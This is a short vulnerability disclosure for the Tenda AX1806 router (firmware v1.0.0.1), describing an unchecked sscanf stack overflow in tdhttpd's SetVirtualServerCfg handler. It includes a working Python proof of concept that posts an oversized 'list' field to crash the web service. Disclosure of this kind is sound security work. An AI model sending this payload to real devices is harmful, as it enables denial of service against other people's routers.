## Overview

- The device's official website: https://www.tenda.com.cn/product/AX1806.html
- Firmware download website: https://www.tenda.com.cn/download/detail-3306.html

## Affected version

v1.0.0.1

## Vulnerability details

tdhttpd in directory /bin has stack overflow vulnerability. The vulnerability occurrs in the `formSetVirtualSer` function, which can be accessed via the URL `goform/SetVirtualServerCfg`. 

<img src="img/image-20220526203950011.png" alt="image-20220526203950011" style="zoom:50%;" />

In function `FUN_000631d0`, the function `sscanf` is called to split it and copy to stack buffer without checking its length.

<img src="img/image-20220526204019758.png" alt="image-20220526204019758" style="zoom:50%;" />

## PoC

Poc of Denial of Service(DoS)

```python
import requests

data = {
    b"list": b'A'*0x400+b'~'
}
res = requests.post("http://127.0.0.1/goform/SetVirtualServerCfg", data=data)
print(res.content)
```

